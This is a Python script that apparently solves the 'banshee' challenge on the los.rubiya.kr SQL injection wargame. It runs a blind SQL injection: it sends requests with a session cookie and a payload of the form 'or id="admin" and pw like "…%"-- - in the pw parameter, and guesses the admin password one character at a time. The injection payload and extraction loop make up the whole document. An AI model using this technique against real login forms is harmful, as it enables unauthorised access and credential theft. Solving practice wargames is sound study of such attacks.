import requests
import string
import time


pw=""
a=string.printable
a=a[:-38]
url = "https://los.rubiya.kr/chall/banshee_ece938c70ea2419a093bb0be9f01a7b1.php"
cookies = {'PHPSESSID':'tq37qs365cufgcpm3p42i13pg6'}
for i in range(1,9):
    for j in a:
        pw_=pw
        pw_+=j
        url="https://los.rubiya.kr/chall/banshee_ece938c70ea2419a093bb0be9f01a7b1.php?pw='or id=\"admin\" and pw like \""+str(pw_)+"%\"-- - "
        res = requests.get(url,cookies=cookies)
        res = res.text
        if "</strong><hr><br><h2>login success!" in res:
            pw+=j
            print(pw)
            break
        else: 
            pass